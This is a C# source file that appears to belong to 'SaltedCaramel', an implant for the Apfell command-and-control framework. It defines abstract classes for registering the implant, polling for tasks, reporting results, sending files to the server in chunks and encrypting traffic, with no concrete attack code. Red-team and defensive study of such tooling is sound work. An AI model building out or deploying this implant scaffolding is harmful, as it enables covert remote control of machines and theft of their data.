using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;

namespace Apfell
{
    namespace Structs
    {
        /// <summary>
        /// Struct for the reply we get when sending a file to the Apfell server
        /// Contains file ID to use when sending a file to the server
        /// </summary>
        internal struct DownloadReply
        {
            public string file_id { get; set; }
        }

        /// <summary>
        /// Struct for file chunks, used when sending files to the Apfell server
        /// </summary>
        internal struct FileChunk
        {
            public int chunk_num;
            public string file_id;
            public string chunk_data;
        }
    }

    namespace C2Profiles
    {
        using SaltedCaramel.Tasks;
        public abstract class C2Profile
        {
            private Crypto.Crypto encryptionHandler;
            public abstract string PostResponse(SCTaskResp taskresp);

            public abstract string RegisterAgent(SaltedCaramel.SCImplant agent);

            public abstract SCTask CheckTasking(SaltedCaramel.SCImplant agent);

            public string SendComplete(string taskId)
            {
                Debug.WriteLine($"[+] SendComplete - Sending task complete for {taskId}");
                SCTaskResp completeResponse = new SCTaskResp(taskId, "{\"completed\": true}");
                return this.PostResponse(completeResponse);
            }

            public string SendError(string taskId, string error)
            {
                Debug.WriteLine($"[+] SendError - Sending error for {taskId}: {error}");
                SCTaskResp errorResponse = new SCTaskResp(taskId, "{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}");
                return this.PostResponse(errorResponse);
            }

            public abstract byte[] GetFile(string file_id, SaltedCaramel.SCImplant implant);
        }
    }

    namespace Crypto
    {
        abstract class Crypto
        {
            internal abstract string Encrypt(string plaintext);

            internal abstract string Decrypt(string encrypted);
        }
    }
}
